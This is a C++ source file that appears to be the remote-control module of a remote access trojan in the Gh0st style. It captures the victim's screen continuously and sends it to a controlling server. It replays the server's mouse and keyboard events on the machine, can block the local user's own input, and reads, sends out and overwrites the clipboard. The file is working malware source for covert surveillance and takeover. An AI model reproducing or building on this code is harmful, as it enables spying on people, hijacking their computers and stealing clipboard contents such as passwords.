#include "stdafx.h"
#include <tchar.h>


#include "RemoteControl.h"


CRemoteControl::CRemoteControl(CIOCPClient *IOCPClient)
	:CManager(IOCPClient)
{
	_tprintf(_T("RemoteControl is under Execution\r\n"));



	_M_IsLoop       = TRUE;
	_M_IsBlockInput = FALSE;
	_M_ScreenSpy    = new CScreenSpy(16);

	if (_M_ScreenSpy == nullptr)
	{
		return;
	}
	
	_M_hThread = CreateThread(
		NULL,
		0,
		(LPTHREAD_START_ROUTINE)_RemoteControlProc,
		(LPVOID)this,
		0,
		NULL
	);

	return;
}

CRemoteControl::~CRemoteControl()
{
	_tprintf(_T("RemoteControl Exit\r\n"));

	_M_IsLoop = FALSE;

	WaitForSingleObject(_M_hThread, INFINITE);

	if (_M_hThread != NULL)
	{
		CloseHandle(_M_hThread);
		_M_hThread = NULL;
	}

	if (_M_ScreenSpy != NULL)
	{
		delete _M_ScreenSpy;
		_M_ScreenSpy = NULL;
	}
}

void  CRemoteControl::PacketHandleIO(PBYTE BufferData, ULONG_PTR BufferLength)
{
	switch (BufferData[0])
	{
	case CLIENT_GO_ON:
	{
		NotifyDialogIsOpen();
		break;
	}
	case CLIENT_REMOTE_CONTROL_CONTROL:
	{
		BlockInput(FALSE);
		AnalyzeCommand(BufferData + 1, BufferLength - 1);
		BlockInput(_M_IsBlockInput);
		break;
	}
	case CLIENT_REMOTE_CONTROL_BLOCK_INPUT:
	{
		_M_IsBlockInput = *(LPBYTE)&BufferData[1];
		BlockInput(_M_IsBlockInput);
		break;
	}
	case CLIENT_REMOTE_CONTROL_GET_CLIPBOARD_REQUIRE:
	{
		SendClipboard();
		break;
	}
	case CLIENT_REMOTE_CONTROL_SET_CLIPBOARD_REQUIRE:
	{
		UpdataClipboard((char*)BufferData + 1, BufferLength - 1);
		break;
	}

	default:
		break;
	}
	return;
}

VOID  CRemoteControl::SendBitmapInfo()
{
	ULONG BufferLength = sizeof(BYTE) + _M_ScreenSpy->GetBitmapInfoSize();
	
	LPBYTE BufferData = (LPBYTE)VirtualAlloc(NULL, BufferLength, MEM_COMMIT, PAGE_READWRITE);
	
	BufferData[0] = CLIENT_REMOTE_CONTROL_REPLY;

	memcpy(BufferData + sizeof(BYTE), _M_ScreenSpy->GetBitmapInfoData(), BufferLength - sizeof(BYTE));


	_M_IOCPClient->OnServerSending((char*)BufferData, BufferLength);
	
	VirtualFree(BufferData, 0, MEM_RELEASE);

	return;
}

VOID  CRemoteControl::SendFirstScreenData()
{
	
	LPVOID BitmapData = NULL;

	BitmapData = _M_ScreenSpy->GetFirstScreenData();

	if (BitmapData == NULL)
	{
		return;
	}

	ULONG  BufferLength = sizeof(BYTE) + _M_ScreenSpy->GetFirstScreenDataSize();
	LPBYTE BufferData   = new BYTE[BufferLength];
	if (BufferData == NULL)
	{
		return;
	}

	BufferData[0] = CLIENT_REMOTE_CONTROL_FIRST_SCREEN;
	memcpy(BufferData + 1, BitmapData, BufferLength - 1);

	_M_IOCPClient->OnServerSending((char*)BufferData, BufferLength);

	delete[] BufferData;
	BufferData = NULL;

	return;
}

VOID  CRemoteControl::SendNextScreenData()
{
	LPVOID BitmapData   = NULL;
	LPBYTE BufferData   = NULL;
	ULONG  BufferLength = 0;
	

	BitmapData = _M_ScreenSpy->GetNextScreenData(&BufferLength);

	if (BufferLength == 0 || BitmapData == NULL)
	{
		return;
	}

	BufferLength += sizeof(BYTE);

	BufferData = new BYTE[BufferLength];
	if (BufferData == NULL)
	{
		return;
	}

	BufferData[0] = CLIENT_REMOTE_CONTROL_NEXT_SCREEN;
	memcpy(BufferData + sizeof(BYTE), BitmapData, BufferLength - sizeof(BYTE));
	
	_M_IOCPClient->OnServerSending((char*)BufferData, BufferLength);
	
	delete[] BufferData;
	BufferData = NULL;

	return;
}

VOID  CRemoteControl::AnalyzeCommand(LPBYTE BufferData, ULONG BufferLength)
{
	if (BufferLength % sizeof(MSG) != 0)
		return;

	ULONG MsgCount = BufferLength / sizeof(MSG);

	for (ULONG i = 0; i < MsgCount; i++)
	{
		MSG *Msg = (MSG*)(BufferData + i * sizeof(MSG));

		switch (Msg->message)
		{
		case WM_LBUTTONDOWN:
		case WM_LBUTTONUP:
		case WM_RBUTTONDOWN:
		case WM_RBUTTONUP:
		case WM_MOUSEMOVE:
		case WM_LBUTTONDBLCLK:
		case WM_RBUTTONDBLCLK:
		case WM_MBUTTONDOWN:
		case WM_MBUTTONUP:
		{
			POINT Point;
			Point.x = LOWORD(Msg->lParam);
			Point.y = HIWORD(Msg->lParam);
			SetCursorPos(Point.x, Point.y);
			SetCapture(WindowFromPoint(Point));

			break;
		}
		default:
			break;

		}

		switch (Msg->message)
		{
		case WM_LBUTTONDOWN:
			mouse_event(MOUSEEVENTF_LEFTDOWN,   0, 0, 0, 0);
			break;
		case WM_LBUTTONUP:
			mouse_event(MOUSEEVENTF_LEFTUP,     0, 0, 0, 0);
			break;
		case WM_RBUTTONDOWN:
			mouse_event(MOUSEEVENTF_RIGHTDOWN,  0, 0, 0, 0);
			break;
		case WM_RBUTTONUP:
			mouse_event(MOUSEEVENTF_RIGHTUP,    0, 0, 0, 0);
			break;
		case WM_MBUTTONDOWN:
			mouse_event(MOUSEEVENTF_MIDDLEDOWN, 0, 0, 0, 0);
			break;
		case WM_MBUTTONUP:
			mouse_event(MOUSEEVENTF_MIDDLEUP,   0, 0, 0, 0);
			break;
		case WM_MOUSEWHEEL:
			mouse_event(MOUSEEVENTF_WHEEL,      0, 0, 0, 0);
			break;
		case WM_LBUTTONDBLCLK:
			mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
			mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
			break;
		case WM_KEYDOWN:
		case WM_SYSKEYDOWN:
			keybd_event(Msg->wParam, MapVirtualKey(Msg->wParam, 0), 0, 0);
			break;
		case WM_KEYUP:
		case WM_SYSKEYUP:
			keybd_event(Msg->wParam, MapVirtualKey(Msg->wParam, 0), KEYEVENTF_KEYUP, 0);
			break;
		default:
			break;
		}
	}
	return;
}

VOID  CRemoteControl::SendClipboard()
{
	if (!::OpenClipboard(NULL))
		return;
	HGLOBAL hGlobal = GetClipboardData(CF_TEXT);
	if (hGlobal == NULL)
	{
		CloseClipboard();
		return;
	}
	int BufferLength = GlobalSize(hGlobal) + 1;
	CHAR* v5 = (LPSTR)GlobalLock(hGlobal);
	
	LPBYTE BufferData = new BYTE[BufferLength];

	BufferData[0] = CLIENT_REMOTE_CONTROL_GET_CLIPBOARD_REPLY;

	memcpy(BufferData + 1, v5, BufferLength - 1);
	GlobalUnlock(hGlobal);
	CloseClipboard();
	_M_IOCPClient->OnServerSending((char*)BufferData, BufferLength);

	delete[] BufferData;
	return;
}

VOID  CRemoteControl::UpdataClipboard(char* BufferData, ULONG BufferLength)
{
	if (!::OpenClipboard(NULL))
		return;

	::EmptyClipboard();
	HGLOBAL hGlobal = GlobalAlloc(GPTR, BufferLength);
	if (hGlobal != NULL)
	{
		char* ClipboardVirtualAddr = (LPSTR)GlobalLock(hGlobal);
		memcpy(ClipboardVirtualAddr, BufferData, BufferLength);
		GlobalUnlock(hGlobal);
		SetClipboardData(CF_TEXT, hGlobal);
		GlobalFree(hGlobal);
	}
	CloseClipboard();

}

DWORD CRemoteControl::_RemoteControlProc(LPVOID lParam)
{

	CRemoteControl *This = (CRemoteControl *)lParam;

	This->SendBitmapInfo();

	// 阻塞等待Server回传消息
	This->WaitForServerDialogOpen();

	This->SendFirstScreenData();

	while (This->_M_IsLoop)
	{
		This->SendNextScreenData();
		Sleep(10);
	}

	_tprintf(_T("_RemoteControlProc() Exit \r\n"));
	return 0;
}
